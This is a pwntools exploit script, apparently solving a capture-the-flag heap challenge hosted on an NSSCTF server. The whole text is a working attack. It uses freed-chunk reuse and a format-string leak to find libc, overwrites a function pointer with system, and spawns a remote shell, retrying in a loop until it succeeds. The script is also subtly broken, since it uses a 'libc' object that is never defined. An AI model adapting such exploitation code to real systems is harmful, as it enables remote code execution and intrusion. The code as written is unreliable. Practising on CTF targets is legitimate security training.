from pwn import *
context(arch = 'amd64', os = 'linux')
#context.log_level = 'debug'

#io = process("./pwn")
elf = ELF("./pwn")
#libc = elf.libc

def debug():
	gdb.attach(io)
	pause()

sd   = lambda s    : io.send(s)
sda  = lambda s, n : io.sendafter(s, n)
sl   = lambda s    : io.sendline(s)
sla  = lambda s, n : io.sendlineafter(s, n)
rc   = lambda n    : io.recv(n)
rut  = lambda s    : io.recvuntil(s, drop=True, timeout=2)
ruf  = lambda s    : io.recvuntil(s, drop=False)
addr = lambda s    : u64(io.recvuntil(s, drop=True).ljust(8, b'\x00'))
byte = lambda n    : str(n).encode()
sh   = lambda      : io.interactive()

menu = b'3.exit\n'
def add(size, content):
	sla(menu, b'add ')
	sla(b'size:', byte(size))
	sda(b'data:', content)

def dele(idx):
	sla(menu, b'delete ')
	sla(b'id:', byte(idx))
	sla(b'sure?:', b'yes')


def exp():
	add(0x20, b'0') # 0
	add(0x20, b'1') # 1
	dele(1)
	dele(0)
	payload = b'%19$pXYZ' + b'B'*0x10 + p16(0xE9B0)
	add(0x20, payload) # 0
	#debug()
	dele(1)
	
	libc.address = int(rut(b'XYZ'), 16) - libc.sym['_IO_2_1_stdout_']
	print("libc_base : ", hex(libc.address))
	#debug()
	add(0x20, b'1\x00') # 1
	add(0x20, b'2\x00') # 2
	dele(2)
	dele(1)
	payload = b'/bin/sh;' + b'A'*0x10 + p64(libc.symbols['system'])
	add(0x20, payload)
	dele(2)
	
	sh()


if __name__ == "__main__":

	"""	
	io = process("./pwn")
	exp()	
	"""
	while True:	
		#io = process("./pwn")		
		io = remote("node4.anna.nssctf.cn", 28559)
		elf = ELF("../silverwolf/libc-2.27.so")
		try:
			exp()
			break
		except Exception as e:
			io.close()
			continue
	
